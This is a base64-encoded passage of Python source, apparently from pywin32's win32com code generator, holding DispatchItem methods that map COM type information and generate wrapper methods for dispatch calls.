Y2VwdCBweXRob25jb20ub2xlX2Vycm9yOlxuICAgICAgICAgICAgcGFzc1xuXG4gICAgICAgIGlmIGlkID09IDAgYW5kIG5hbWU6XG4gICAgICAgICAgICBzZWxmLmRlZmF1bHREaXNwYXRjaE5hbWUgPSBuYW1lXG5cbiAgICAgICAgaW52a2luZCA9IGZkZXNjLmludmtpbmRcblxuICAgICAgICAjIFdlIG5lZWQgdG8gdHJhbnNsYXRlIGFueSBBbGlhc1wnLCBFbnVtcywgc3RydWN0cyBldGMgaW4gcmVzdWx0IGFuZCBhcmdzXG4gICAgICAgIHR5cGVyZXByLCBmbGFnLCBkZWZ2YWwgPSBmZGVzYy5yZXR0eXBlXG4gICAgICAgICMgXHRcdHN5cy5zdGRlcnIud3JpdGUoIiVzIHJlc3VsdCAtICVzIC0+ICIgJSAobmFtZSwgdHlwZXJlcHIpKVxuICAgICAgICB0eXBlcmVwciwgcmVzdWx0Q0xTSUQsIHJlc3VsdERvYyA9IF9SZXNvbHZlVHlwZSh0eXBlcmVwciwgdHlwZWluZm8pXG4gICAgICAgICMgXHRcdHN5cy5zdGRlcnIud3JpdGUoIiVzXFxuIiAlICh0eXBlcmVwciwpKVxuICAgICAgICBmZGVzYy5yZXR0eXBlID0gdHlwZXJlcHIsIGZsYWcsIGRlZnZhbCwgcmVzdWx0Q0xTSURcbiAgICAgICAgIyBUcmFuc2xhdGUgYW55IEFsaWFzIG9yIEVudW1zIGluIGFyZ3VtZW50IGxpc3QuXG4gICAgICAgIGFyZ0xpc3QgPSBbXVxuICAgICAgICBmb3IgYXJnRGVzYyBpbiBmZGVzYy5hcmdzOlxuICAgICAgICAgICAgdHlwZXJlcHIsIGZsYWcsIGRlZnZhbCA9IGFyZ0Rlc2NcbiAgICAgICAgICAgICMgXHRcdFx0c3lzLnN0ZGVyci53cml0ZSgiJXMgYXJnIC0gJXMgLT4gIiAlIChuYW1lLCB0eXBlcmVwcikpXG4gICAgICAgICAgICBhcmdfdHlwZSwgYXJnX2Nsc2lkLCBhcmdfZG9jID0gX1Jlc29sdmVUeXBlKHR5cGVyZXByLCB0eXBlaW5mbylcbiAgICAgICAgICAgIGFyZ0Rlc2MgPSBhcmdfdHlwZSwgZmxhZywgZGVmdmFsLCBhcmdfY2xzaWRcbiAgICAgICAgICAgICMgXHRcdFx0c3lzLnN0ZGVyci53cml0ZSgiJXNcXG4iICUgKGFyZ0Rlc2NbMF0sKSlcbiAgICAgICAgICAgIGFyZ0xpc3QuYXBwZW5kKGFyZ0Rlc2MpXG4gICAgICAgIGZkZXNjLmFyZ3MgPSB0dXBsZShhcmdMaXN0KVxuXG4gICAgICAgIGhpZGRlbiA9IChmdW5jZmxhZ3MgJiBweXRob25jb20uRlVOQ0ZMQUdfRkhJRERFTikgIT0gMFxuICAgICAgICBpZiBpbnZraW5kID09IHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlHRVQ6XG4gICAgICAgICAgICBtYXAgPSBzZWxmLnByb3BNYXBHZXRcbiAgICAgICAgIyBUaGlzIGlzIG5vdCB0aGUgYmVzdCBzb2x1dGlvbiwgYnV0IEkgZG9udCB0aGluayB0aGVyZSBpc1xuICAgICAgICAjIG9uZSB3aXRob3V0IHNwZWNpZmljICJzZXQiIHN5bnRheC5cbiAgICAgICAgIyBJZiB0aGVyZSBpcyBhIHNpbmdsZSBQVVQgb3IgUFVUUkVGLCBpdCB3aWxsIGZ1bmN0aW9uIGFzIGEgcHJvcGVydHkuXG4gICAgICAgICMgSWYgdGhlcmUgYXJlIGJvdGgsIHRoZW4gdGhlIFBVVCByZW1haW5zIGEgcHJvcGVydHksIGFuZCB0aGUgUFVUUkVGXG4gICAgICAgICMgZ2V0cyB0cmFuc2Zvcm1lZCBpbnRvIGEgZnVuY3Rpb24uXG4gICAgICAgICMgKGluIHZiLCBQVVQ9PSJvYmo9b3RoZXJfb2JqIiwgUFVUUkVGPSJzZXQgb2JqPW90aGVyX29ialxuICAgICAgICBlbGlmIGludmtpbmQgaW4gKHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlQVVQsIHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlQVVRSRUYpOlxuICAgICAgICAgICAgIyBTcGVjaWFsIGNhc2VcbiAgICAgICAgICAgIGV4aXN0aW5nID0gc2VsZi5wcm9wTWFwUHV0LmdldChuYW1lLCBOb25lKVxuICAgICAgICAgICAgaWYgZXhpc3RpbmcgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgaWYgZXhpc3RpbmcuZGVzY1s0XSA9PSBweXRob25jb20uSU5WT0tFX1BST1BFUlRZUFVUOiAgIyBLZWVwIHRoaXMgb25lXG4gICAgICAgICAgICAgICAgICAgIG1hcCA9IHNlbGYubWFwRnVuY3NcbiAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJTZXQiICsgbmFtZVxuICAgICAgICAgICAgICAgIGVsc2U6ICAjIEV4aXN0aW5nIGJlY29tZXMgYSBmdW5jLlxuICAgICAgICAgICAgICAgICAgICBleGlzdGluZy53YXNQcm9wZXJ0eSA9IDFcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5tYXBGdW5jc1siU2V0IiArIG5hbWVdID0gZXhpc3RpbmdcbiAgICAgICAgICAgICAgICAgICAgbWFwID0gc2VsZi5wcm9wTWFwUHV0ICAjIGV4aXN0aW5nIGdldHMgb3ZlcndyaXR0ZW4gYmVsb3cuXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIG1hcCA9IHNlbGYucHJvcE1hcFB1dCAgIyBmaXJzdCB0aW1lIHdldmUgc2VlbiBpdC5cblxuICAgICAgICBlbGlmIGludmtpbmQgPT0gcHl0aG9uY29tLklOVk9LRV9GVU5DOlxuICAgICAgICAgICAgbWFwID0gc2VsZi5tYXBGdW5jc1xuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgbWFwID0gTm9uZVxuICAgICAgICBpZiBub3QgbWFwIGlzIE5vbmU6XG4gICAgICAgICAgICAjIFx0XHRcdFx0aWYgbWFwLmhhc19rZXkobmFtZSk6XG4gICAgICAgICAgICAjIFx0XHRcdFx0XHRzeXMuc3RkZXJyLndyaXRlKCJXYXJuaW5nIC0gb3ZlcndyaXRpbmcgZXhpc3RpbmcgbWV0aG9kL2F0dHJpYnV0ZSAlc1xcbiIgJSBuYW1lKVxuICAgICAgICAgICAgbWFwW25hbWVdID0gTWFwRW50cnkoZmRlc2MsIG5hbWVzLCBkb2MsIHJlc3VsdENMU0lELCByZXN1bHREb2MsIGhpZGRlbilcbiAgICAgICAgICAgICMgYW55IG1ldGhvZHMgdGhhdCBjYW5cJ3QgYmUgcmVhY2hlZCB2aWEgRElTUEFUQ0ggd2UgcmV0dXJuIE5vbmVcbiAgICAgICAgICAgICMgZm9yLCBzbyBkeW5hbWljIGRpc3BhdGNoIGRvZXNudCBzZWUgaXQuXG4gICAgICAgICAgICBpZiBmZGVzYy5mdW5ja2luZCAhPSBweXRob25jb20uRlVOQ19ESVNQQVRDSDpcbiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZVxuICAgICAgICAgICAgcmV0dXJuIChuYW1lLCBtYXApXG4gICAgICAgIHJldHVybiBOb25lXG5cbiAgICBkZWYgX0FkZFZhcl8oc2VsZiwgdHlwZWluZm8sIHZhcmRlc2MsIGJGb3JVc2VyKTpcbiAgICAgICAgIyMjIG5lZWQgcHl0aG9uY29tLlZBUkZMQUdfRlJFU1RSSUNURUQgLi4uXG4gICAgICAgICMjIyB0aGVuIGNoZWNrIGl0XG4gICAgICAgIGFzc2VydCB2YXJkZXNjLmRlc2NraW5kID09IHB5dGhvbmNvbS5ERVNDS0lORF9WQVJERVNDXG5cbiAgICAgICAgaWYgdmFyZGVzYy52YXJraW5kID09IHB5dGhvbmNvbS5WQVJfRElTUEFUQ0g6XG4gICAgICAgICAgICBpZCA9IHZhcmRlc2MubWVtaWRcbiAgICAgICAgICAgIG5hbWVzID0gdHlwZWluZm8uR2V0TmFtZXMoaWQpXG4gICAgICAgICAgICAjIFRyYW5zbGF0ZSBhbnkgQWxpYXMgb3IgRW51bXMgaW4gcmVzdWx0LlxuICAgICAgICAgICAgdHlwZXJlcHIsIGZsYWdzLCBkZWZ2YWwgPSB2YXJkZXNjLmVsZW1kZXNjVmFyXG4gICAgICAgICAgICB0eXBlcmVwciwgcmVzdWx0Q0xTSUQsIHJlc3VsdERvYyA9IF9SZXNvbHZlVHlwZSh0eXBlcmVwciwgdHlwZWluZm8pXG4gICAgICAgICAgICB2YXJkZXNjLmVsZW1kZXNjVmFyID0gdHlwZXJlcHIsIGZsYWdzLCBkZWZ2YWxcbiAgICAgICAgICAgIGRvYyA9IE5vbmVcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBpZiBiRm9yVXNlcjpcbiAgICAgICAgICAgICAgICAgICAgZG9jID0gdHlwZWluZm8uR2V0RG9jdW1lbnRhdGlvbihpZClcbiAgICAgICAgICAgIGV4Y2VwdCBweXRob25jb20ub2xlX2Vycm9yOlxuICAgICAgICAgICAgICAgIHBhc3NcblxuICAgICAgICAgICAgIyBoYW5kbGUgdGhlIGVudW1lcmF0b3Igc3BlY2lhbGx5XG4gICAgICAgICAgICBtYXAgPSBzZWxmLnByb3BNYXBcbiAgICAgICAgICAgICMgQ2hlY2sgaWYgdGhlIGVsZW1lbnQgaXMgaGlkZGVuLlxuICAgICAgICAgICAgaGlkZGVuID0gKHZhcmRlc2Mud1ZhckZsYWdzICYgMHg0MCkgIT0gMCAgIyBWQVJGTEFHX0ZISURERU5cbiAgICAgICAgICAgIG1hcFtuYW1lc1swXV0gPSBNYXBFbnRyeShcbiAgICAgICAgICAgICAgICB2YXJkZXNjLCBuYW1lcywgZG9jLCByZXN1bHRDTFNJRCwgcmVzdWx0RG9jLCBoaWRkZW5cbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIHJldHVybiAobmFtZXNbMF0sIG1hcClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHJldHVybiBOb25lXG5cbiAgICBkZWYgQnVpbGQoc2VsZiwgdHlwZWluZm8sIGF0dHIsIGJGb3JVc2VyPTEpOlxuICAgICAgICBzZWxmLmNsc2lkID0gYXR0clswXVxuICAgICAgICBzZWxmLmJJc0Rpc3BhdGNoID0gKGF0dHIud1R5cGVGbGFncyAmIHB5dGhvbmNvbS5UWVBFRkxBR19GRElTUEFUQ0hBQkxFKSAhPSAwXG4gICAgICAgIGlmIHR5cGVpbmZvIGlzIE5vbmU6XG4gICAgICAgICAgICByZXR1cm5cbiAgICAgICAgIyBMb29wIG92ZXIgYWxsIG1ldGhvZHNcbiAgICAgICAgZm9yIGogaW4gcmFuZ2UoYXR0cls2XSk6XG4gICAgICAgICAgICBmZGVzYyA9IHR5cGVpbmZvLkdldEZ1bmNEZXNjKGopXG4gICAgICAgICAgICBzZWxmLl9BZGRGdW5jXyh0eXBlaW5mbywgZmRlc2MsIGJGb3JVc2VyKVxuXG4gICAgICAgICMgTG9vcCBvdmVyIGFsbCB2YXJpYWJsZXMgKGllLCBwcm9wZXJ0aWVzKVxuICAgICAgICBmb3IgaiBpbiByYW5nZShhdHRyWzddKTpcbiAgICAgICAgICAgIGZkZXNjID0gdHlwZWluZm8uR2V0VmFyRGVzYyhqKVxuICAgICAgICAgICAgc2VsZi5fQWRkVmFyXyh0eXBlaW5mbywgZmRlc2MsIGJGb3JVc2VyKVxuXG4gICAgICAgICMgTm93IHBvc3QtcHJvY2VzcyB0aGUgbWFwcy4gIEZvciBhbnkgIkdldCIgb3IgIlNldCIgcHJvcGVydGllc1xuICAgICAgICAjIHRoYXQgaGF2ZSBhcmd1bWVudHMsIHdlIG11c3QgdHVybiB0aGVtIGludG8gbWV0aG9kcy4gIElmIGEgbWV0aG9kXG4gICAgICAgICMgb2YgdGhlIHNhbWUgbmFtZSBhbHJlYWR5IGV4aXN0cywgY2hhbmdlIHRoZSBuYW1lLlxuICAgICAgICBmb3Iga2V5LCBpdGVtIGluIGxpc3Qoc2VsZi5wcm9wTWFwR2V0Lml0ZW1zKCkpOlxuICAgICAgICAgICAgc2VsZi5fcHJvcE1hcEdldENoZWNrXyhrZXksIGl0ZW0pXG5cbiAgICAgICAgZm9yIGtleSwgaXRlbSBpbiBsaXN0KHNlbGYucHJvcE1hcFB1dC5pdGVtcygpKTpcbiAgICAgICAgICAgIHNlbGYuX3Byb3BNYXBQdXRDaGVja18oa2V5LCBpdGVtKVxuXG4gICAgZGVmIENvdW50SW5PdXRPcHRBcmdzKHNlbGYsIGFyZ1R1cGxlKTpcbiAgICAgICAgIlJldHVybiB0dXBsZSBjb3VudGluZyBpbi9vdXRzL09QVFMuICBTdW0gb2YgcmVzdWx0IG1heSBub3QgYmUgbGVuKGFyZ1R1cGxlKSwgYXMgc29tZSBhcmdzIG1heSBiZSBpbi9vdXQuIlxuICAgICAgICBpbnMgPSBvdXQgPSBvcHRzID0gMFxuICAgICAgICBmb3IgYXJnQ2hlY2sgaW4gYXJnVHVwbGU6XG4gICAgICAgICAgICBpbk91dCA9IGFyZ0NoZWNrWzFdXG4gICAgICAgICAgICBpZiBpbk91dCA9PSAwOlxuICAgICAgICAgICAgICAgIGlucyA9IGlucyArIDFcbiAgICAgICAgICAgICAgICBvdXQgPSBvdXQgKyAxXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGlmIGluT3V0ICYgcHl0aG9uY29tLlBBUkFNRkxBR19GSU46XG4gICAgICAgICAgICAgICAgICAgIGlucyA9IGlucyArIDFcbiAgICAgICAgICAgICAgICBpZiBpbk91dCAmIHB5dGhvbmNvbS5QQVJBTUZMQUdfRk9QVDpcbiAgICAgICAgICAgICAgICAgICAgb3B0cyA9IG9wdHMgKyAxXG4gICAgICAgICAgICAgICAgaWYgaW5PdXQgJiBweXRob25jb20uUEFSQU1GTEFHX0ZPVVQ6XG4gICAgICAgICAgICAgICAgICAgIG91dCA9IG91dCArIDFcbiAgICAgICAgcmV0dXJuIGlucywgb3V0LCBvcHRzXG5cbiAgICBkZWYgTWFrZUZ1bmNNZXRob2Qoc2VsZiwgZW50cnksIG5hbWUsIGJNYWtlQ2xhc3M9MSk6XG4gICAgICAgICMgSWYgd2UgaGF2ZSBhIHR5cGUgZGVzY3JpcHRpb24sIGFuZCBub3QgdmFyYXJncy4uLlxuICAgICAgICBpZiBlbnRyeS5kZXNjIGlzIG5vdCBOb25lIGFuZCAobGVuKGVudHJ5LmRlc2MpIDwgNiBvciBlbnRyeS5kZXNjWzZdICE9IC0xKTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLk1ha2VEaXNwYXRjaEZ1bmNNZXRob2QoZW50cnksIG5hbWUsIGJNYWtlQ2xhc3MpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5NYWtlVmFyQXJnc0Z1bmNNZXRob2QoZW50cnksIG5hbWUsIGJNYWtlQ2xhc3MpXG5cbiAgICBkZWYgTWFrZURpc3BhdGNoRnVuY01ldGhvZChzZWxmLCBlbnRyeSwgbmFtZSwgYk1ha2VDbGFzcz0xKTpcbiAgICAgICAgZmRlc2MgPSBlbnRyeS5kZXNjXG4gICAgICAgIGRvYyA9IGVudHJ5LmRvY1xuICAgICAgICBuYW1lcyA9IGVudHJ5Lm5hbWVzXG4gICAgICAgIHJldCA9IFtdXG4gICAgICAgIGlmIGJNYWtlQ2xhc3M6XG4gICAgICAgICAgICBsaW5lUHJlZml4ID0gIlxcdCJcbiAgICAgICAgICAgIGRlZk5hbWVkT3B0QXJnID0gImRlZmF1bHROYW1lZE9wdEFyZyJcbiAgICAgICAgICAgIGRlZk5hbWVkTm90T3B0QXJnID0gImRlZmF1bHROYW1lZE5vdE9wdEFyZyJcbiAgICAgICAgICAgIGRlZlVubmFtZWRBcmcgPSAiZGVmYXVsdFVubmFtZWRBcmciXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBsaW5lUHJlZml4ID0gIiJcbiAgICAgICAgICAgIGRlZk5hbWVkT3B0QXJnID0gInB5dGhvbmNvbS5NaXNzaW5nIlxuICAgICAgICAgICAgZGVmTmFtZWROb3RPcHRBcmcgPSAicHl0aG9uY29tLk1pc3NpbmciXG4gICAgICAgICAgICBkZWZVbm5hbWVkQXJnID0gInB5dGhvbmNvbS5NaXNzaW5nIlxuICAgICAgICBkZWZPdXRBcmcgPSAicHl0aG9uY29tLk1pc3NpbmciXG4gICAgICAgIGlkID0gZmRlc2NbMF1cblxuICAgICAgICBzID0gKFxuICAgICAgICAgICAgbGluZVByZWZpeFxuICAgICAgICAgICAgKyAiZGVmICJcbiAgICAgICAgICAgICsgbmFtZVxuICAgICAgICAgICAgKyAiKHNlbGYiXG4gICAgICAgICAgICArIEJ1aWxkQ2FsbExpc3QoXG4gICAgICAgICAgICAgICAgZmRlc2MsXG4gICAgICAgICAgICAgICAgbmFtZXMsXG4gICAgICAgICAgICAgICAgZGVmTmFtZWRPcHRBcmcsXG4gICAgICAgICAgICAgICAgZGVmTmFtZWROb3RPcHRBcmcsXG4gICAgICAgICAgICAgICAgZGVmVW5uYW1lZEFyZyxcbiAgICAgICAgICAgICAgICBkZWZPdXRBcmcsXG4gICAgICAgICAgICApXG4gICAgICAgICAgICArICIpOiJcbiAgICAgICAgKVxuICAgICAgICByZXQuYXBwZW5kKHMpXG4gICAgICAgIGlmIGRvYyBhbmQgZG9jWzFdOlxuICAgICAgICAgICAgcmV0LmFwcGVuZChsaW5lUHJlZml4ICsgIlxcdCIgKyBfbWFrZURvY1N0cmluZyhkb2NbMV0pKVxuXG4gICAgICAgIHJlc2Nsc2lkID0gZW50cnkuR2V0UmVzdWx0Q0xTSUQoKVxuICAgICAgICBpZiByZXNjbHNpZDpcbiAgICAgICAgICAgIHJlc2Nsc2lkID0gIlwnJXNcJyIgJSByZXNjbHNpZFxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgcmVzY2xzaWQgPSAiTm9uZSJcbiAgICAgICAgIyBTdHJpcCB0aGUgZGVmYXVsdCB2YWx1ZXMgZnJvbSB0aGUgYXJnIGRlc2NcbiAgICAgICAgcmV0RGVzYyA9IGZkZXNjWzhdWzoyXVxuICAgICAgICBhcmdzRGVzYyA9IHR1cGxlKFt3aGF0WzoyXSBmb3Igd2hhdCBpbiBmZGVzY1syXV0pXG4gICAgICAgICMgVGhlIHJ1bnRpbWUgdHJhbnNsYXRpb24gb2YgdGhlIHJldHVybiB0eXBlcyBpcyBleHBlbnNpdmUsIHNvIHdoZW4gd2Uga25vdyB0aGVcbiAgICAgICAgIyByZXR1cm4gdHlwZSBvZiB0aGUgZnVuY3Rpb24sIHRoZXJlIGlzIG5vIG5lZWQgdG8gY2hlY2sgdGhlIHR5cGUgYXQgcnVudGltZS5cbiAgICAgICAgIyBUbyBxdWFsaWZ5LCB0aGlzIGZ1bmN0aW9uIG11c3QgcmV0dXJuIGEgInNpbXBsZSIgdHlwZSwgYW5kIGhhdmUgbm8gYnlyZWYgYXJncy5cbiAgICAgICAgIyBDaGVjayBpZiB3ZSBoYXZlIGJ5cmVmcyBvciBhbnl0aGluZyBpbiB0aGUgYXJncyB3aGljaCBtZWFuIHdlIHN0aWxsIG5lZWQgYSB0cmFuc2xhdGUuXG4gICAgICAgIHBhcmFtX2ZsYWdzID0gW3doYXRbMV0gZm9yIHdoYXQgaW4gZmRlc2NbMl1dXG4gICAgICAgIGJhZF9wYXJhbXMgPSBbXG4gICAgICAgICAgICBmbGFnXG4gICAgICAgICAgICBmb3IgZmxhZyBpbiBwYXJhbV9mbGFnc1xuICAgICAgICAgICAgaWYgZmxhZyAmIChweXRob25jb20uUEFSQU1GTEFHX0ZPVVQgfCBweXRob25jb20uUEFSQU1GTEFHX0ZSRVRWQUwpICE9IDBcbiAgICAgICAgXVxuICAgICAgICBzID0gTm9uZVxuICAgICAgICBpZiBsZW4oYmFkX3BhcmFtcykgPT0gMCBhbmQgbGVuKHJldERlc2MpID09IDIgYW5kIHJldERlc2NbMV0gPT0gMDpcbiAgICAgICAgICAgIHJkID0gcmV0RGVzY1swXVxuICAgICAgICAgICAgaWYgcmQgaW4gTm9UcmFuc2xhdGVNYXA6XG4gICAgICAgICAgICAgICAgcyA9ICIlc1xcdHJldHVybiBzZWxmLl9vbGVvYmpfLkludm9rZVR5cGVzKCVkLCBMQ0lELCAlcywgJXMsICVzJXMpIiAlIChcbiAgICAgICAgICAgICAgICAgICAgbGluZVByZWZpeCxcbiAgICAgICAgICAgICAgICAgICAgaWQsXG4gICAgICAgICAgICAgICAgICAgIGZkZXNjWzRdLFxuICAgICAgICAgICAgICAgICAgICByZXREZXNjLFxuICAgICAgICAgICAgICAgICAgICBhcmdzRGVzYyxcbiAgICAgICAgICAgICAgICAgICAgX0J1aWxkQXJnTGlzdChmZGVzYywgbmFtZXMpLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgIGVsaWYgcmQgaW4gW3B5dGhvbmNvbS5WVF9ESVNQQVRDSCwgcHl0aG9uY29tLlZUX1VOS05PV05dOlxuICAgICAgICAgICAgICAgIHMgPSAiJXNcXHRyZXQgPSBzZWxmLl9vbGVvYmpfLkludm9rZVR5cGVzKCVkLCBMQ0lELCAlcywgJXMsICVzJXMpXFxuIiAlIChcbiAgICAgICAgICAgICAgICAgICAgbGluZVByZWZpeCxcbiAgICAgICAgICAgICAgICAgICAgaWQsXG4gICAgICAgICAgICAgICAgICAgIGZkZXNjWzRdLFxuICAgICAgICAgICAgICAgICAgICByZXREZXNjLFxuICAgICAgICAgICAgICAgICAgICByZXByKGFyZ3NEZXNjKSxcbiAgICAgICAgICAgICAgICAgICAgX0J1aWxkQXJnTGlzdChmZGVzYywgbmFtZXMpLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBzID0gcyArICIlc1xcdGlmIHJldCBpcyBub3QgTm9uZTpcXG4iICUgKGxpbmVQcmVmaXgsKVxuICAgICAgICAgICAgICAgIGlmIHJkID09IHB5dGhvbmNvbS5WVF9VTktOT1dOOlxuICAgICAgICAgICAgICAgICAgICBzID0gcyArICIlc1xcdFxcdCMgU2VlIGlmIHRoaXMgSVVua25vd24gaXMgcmVhbGx5IGFuIElEaXNwYXRjaFxcbiIgJSAoXG4gICAgICAgICAgICAgICAgICAgICAgICBsaW5lUHJlZml4LFxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgICAgIHMgPSBzICsgIiVzXFx0XFx0dHJ5OlxcbiIgJSAobGluZVByZWZpeCwpXG4gICAgICAgICAgICAgICAgICAgIHMgPSAoXG4gICAgICAgICAgICAgICAgICAgICAgICBzXG4gICAgICAgICAgICAgICAgICAgICAgICArICIlc1xcdFxcdFxcdHJldCA9IHJldC5RdWVyeUludGVyZmFjZShweXRob25jb20uSUlEX0lEaXNwYXRjaClcXG4iXG4gICAgICAgICAgICAgICAgICAgICAgICAlIChsaW5lUHJlZml4LClcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgICAgICBzID0gcyArICIlc1xcdFxcdGV4Y2VwdCBweXRob25jb20uZXJyb3I6XFxuIiAlIChsaW5lUHJlZml4LClcbiAgICAgICAgICAgICAgICAgICAgcyA9IHMgKyAiJXNcXHRcXHRcXHRyZXR1cm4gcmV0XFxuIiAlIChsaW5lUHJlZml4LClcbiAgICAgICAgICAgICAgICBzID0gcyArICIlc1xcdFxcdHJldCA9IERpc3BhdGNoKHJldCwgJXMsICVzKVxcbiIgJSAoXG4gICAgICAgICAgICAgICAgICAgIGxpbmVQcmVmaXgsXG4gICAgICAgICAgICAgICAgICAgIHJlcHIobmFtZSksXG4gICAgICAgICAgICAgICAgICAgIHJlc2Nsc2lkLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBzID0gcyArICIlc1xcdHJldHVybiByZXQiICUgKGxpbmVQcmVmaXgpXG4gICAgICAgICAgICBlbGlmIHJkID09IHB5dGhvbmNvbS5WVF9CU1RSOlxuICAgICAgICAgICAgICAgIHMgPSAiJXNcXHQjIFJlc3VsdCBpcyBhIFVuaWNvZGUgb2JqZWN0XFxuIiAlIChsaW5lUHJlZml4LClcbiAgICAgICAgICAgICAgICBzID0gKFxuICAgICAgICAgICAgICAgICAgICBzXG4gICAgICAgICAgICAgICAgICAgICsgIiVzXFx0cmV0dXJuIHNlbGYuX29sZW9ial8uSW52b2tlVHlwZXMoJWQsIExDSUQsICVzLCAlcywgJXMlcykiXG4gICAgICAgICAgICAgICAgICAgICUgKFxuICAgICAgICAgICAgICAgICAgICAgICAgbGluZVByZWZpeCxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgZmRlc2NbNF0sXG4gICAgICAgICAgICAgICAgICAgICAgICByZXREZXNjLFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVwcihhcmdzRGVzYyksXG4gICAgICAgICAgICAgICAgICAgICAgICBfQnVpbGRBcmdMaXN0KGZkZXNjLCBuYW1lcyksXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAjIGVsc2UgcyByZW1haW5zIE5vbmVcbiAgICAgICAgaWYgcyBpcyBOb25lOlxuICAgICAgICAgICAgcyA9ICIlc1xcdHJldHVybiBzZWxmLl9BcHBseVR5cGVzXyglZCwgJXMsICVzLCAlcywgJXMsICVzJXMpIiAlIChcbiAgICAgICAgICAgICAgICBsaW5lUHJlZml4LFxuICAgICAgICAgICAgICAgIGlkLFxuICAgICAgICAgICAgICAgIGZkZXNjWzRdLFxuICAgICAgICAgICAgICAgIHJldERlc2MsXG4gICAgICAgICAgICAgICAgYXJnc0Rlc2MsXG4gICAgICAgICAgICAgICAgcmVwcihuYW1lKSxcbiAgICAgICAgICAgICAgICByZXNjbHNpZCxcbiAgICAgICAgICAgICAgICBfQnVpbGRBcmdMaXN0KGZkZXNjLCBuYW1lcyksXG4gICAgICAgICAgICApXG5cbiAgICAgICAgcmV0LmFwcGVuZChzKVxuICAgICAgICByZXQuYXBwZW5kKCIiKVxuICAgICAgICByZXR1cm4gcmV0XG5cbiAgICBkZWYgTWFrZVZhckFyZ3NGdW5jTWV0aG9kKHNlbGYsIGVudHJ5LCBuYW1lLCBiTWFrZUNsYXNzPTEpOlxuICAgICAgICBmZGVzYyA9IGVudHJ5LmRlc2NcbiAgICAgICAgbmFtZXMgPSBlbnRyeS5uYW1lc1xuICAgICAgICBkb2MgPSBlbnRyeS5kb2NcbiAgICAgICAgcmV0ID0gW11cbiAgICAgICAgYXJnUHJlZml4ID0gInNlbGYiXG4gICAgICAgIGlmIGJNYWtlQ2xhc3M6XG4gICAgICAgICAgICBsaW5lUHJlZml4ID0gIlxcdCJcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGxpbmVQcmVmaXggPSAiIlxuICAgICAgICByZXQuYXBwZW5kKGxpbmVQcmVmaXggKyAiZGVmICIgKyBuYW1lICsgIigiICsgYXJnUHJlZml4ICsgIiwgKmFyZ3MpOiIpXG4gICAgICAgIGlmIGRvYyBhbmQgZG9jWzFdOlxuICAgICAgICAgICAgcmV0LmFwcGVuZChsaW5lUHJlZml4ICsgIlxcdCIgKyBfbWFrZURvY1N0cmluZyhkb2NbMV0pKVxuICAgICAgICBpZiBmZGVzYzpcbiAgICAgICAgICAgIGludm9rZXR5cGUgPSBmZGVzY1s0XVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgaW52b2tldHlwZSA9IHB5dGhvbmNvbS5ESVNQQVRDSF9NRVRIT0RcbiAgICAgICAgcyA9IGxpbmVQcmVmaXggKyAiXFx0cmV0dXJuIHNlbGYuX2dldF9nb29kX29iamVjdF8oc2VsZi5fb2xlb2JqXy5JbnZva2UoKigoIlxuICAgICAgICByZXQuYXBwZW5kKFxuICAgICAgICAgICAgcyArIHN0cihlbnRyeS5kaXNwaWQpICsgIiwwLCVkLDEpK2FyZ3MpKSxcJyVzXCcpIiAlIChpbnZva2V0eXBlLCBuYW1lc1swXSlcbiAgICAgICAgKVxuICAgICAgICByZXQuYXBwZW5kKCIiKVxuICAgICAgICByZXR1cm4gcmV0XG5cblxuIyBOb3RlIC0gIkRpc3BhdGNoSXRlbSIgcG9vcmx5IG5hbWVkIC0gbmVlZCBhIG5ldyBpbnRlcm1lZGlhdGUgY2xhc3MuXG5jbGFzcyBWVGFibGVJdGVtKERpc3BhdGNoSXRlbSk6XG4gICAgZGVmIEJ1aWxkKHNlbGYsIHR5cGVpbmZvLCBhdHRyLCBiRm9yVXNlcj0xKTpcbiAgICAgICAgRGlzcGF0Y2hJdGVtLkJ1aWxkKHNlbGYsIHR5cGVpbmZvLCBhdHRyLCBiRm9yVXNlcilcbiAgICAgICAgYXNzZXJ0IHR5cGVpbmZvIGlzIG5vdCBOb25lLCAiQ2FudCBidWlsZCB2dGFibGVzIHdpdGhvdXQgdHlwZSBpbmZvISJcblxuICAgICAgICBtZXRoX2xpc3QgPSAoXG4gICAgICAgICAgICBsaXN0KHNlbGYubWFwRnVuY3MudmFsdWVzKCkpXG4gICAgICAgICAgICArIGxpc3Qoc2VsZi5wcm9wTWFwR2V0LnZhbHVlcygpKVxuICAgICAgICAgICAgKyBsaXN0KHNlbGYucHJvcE1hcFB1dC52YWx1ZXMoKSlcbiAgICAgICAgKVxuICAgICAgICBtZXRoX2xpc3Quc29ydChrZXk9bGFtYmRhIG06IG0uZGVzY1s3XSlcblxuICAgICAgICAjIE5vdyB0dXJuIHRoaXMgbGlzdCBpbnRvIHRoZSBydW4tdGltZSByZXByZXNlbnRhdGlvblxuICAgICAgICAjIChyZWF